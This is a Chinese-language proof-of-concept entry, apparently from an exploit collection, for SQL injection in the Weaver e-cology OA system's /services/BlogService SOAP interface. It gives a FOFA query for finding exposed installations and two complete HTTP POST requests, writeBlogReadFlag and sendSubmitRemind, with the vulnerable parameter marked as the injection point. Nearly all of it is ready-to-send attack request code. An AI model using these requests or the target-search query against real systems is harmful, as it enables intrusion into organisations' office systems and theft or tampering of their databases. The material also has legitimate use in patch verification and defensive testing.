# 泛微ecology系统接口BlogService存在SQL注入漏洞

泛微ecology系统接口`/services/BlogService`存在SQL注入漏洞

## fofa

```yaml
app="泛微-OA（e-cology）"
```

## poc

```java
POST /services/BlogService HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: 
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 192.168.3.139
Content-Length: 493

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:writeBlogReadFlag>
         <web:string>1</web:string>
         <web:string>注入点</web:string>
         <web:string></web:string>
      </web:writeBlogReadFlag>
   </soapenv:Body>
</soapenv:Envelope>
```

```java
POST /services/BlogService HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: 
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 192.168.3.139
Content-Length: 469

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:sendSubmitRemind>
         <!--type: string-->
         <web:in0>1</web:in0>
         <!--type: string-->
         <web:in1>2</web:in1>
         <!--type: string-->
         <web:in2>注入点</web:in2>
      </web:sendSubmitRemind>
   </soapenv:Body>
</soapenv:Envelope>
```



## 漏洞来源

- https://mp.weixin.qq.com/s/4mJg0FuOOIBjZn-qTMSaeA